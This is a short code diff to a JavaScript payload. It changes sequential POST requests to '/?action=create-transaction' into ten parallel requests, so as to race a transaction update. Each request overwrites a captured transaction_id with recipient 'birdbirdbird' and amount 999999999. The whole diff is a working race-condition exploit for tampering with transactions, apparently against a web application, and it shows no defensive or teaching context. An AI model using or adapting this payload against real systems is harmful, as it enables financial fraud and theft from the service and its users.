@@ -38,13 +38,17 @@
   // If found, immediately update with large amount
   if (transactionId) {
     // Try to race the update by firing N parallel overwrite attempts
-  for (let i = 0; i < 10; i++) {
-    await fetch('/?action=create-transaction', {
-      method:'POST',
-      body:`recipient=birdbirdbird&amount=999999999&transaction_id=${transactionId}`,
-      headers:{'Content-Type':'application/x-www-form-urlencoded'}
-    });
-  }
+  const overwriteRequests = [];
+for (let i = 0; i < 10; i++) {
+  overwriteRequests.push(
+    fetch('/?action=create-transaction', {
+      method: 'POST',
+      body: `recipient=birdbirdbird&amount=999999999&transaction_id=${transactionId}`,
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+    })
+  );
+}
+await Promise.all(overwriteRequests);
 
   }
 })();
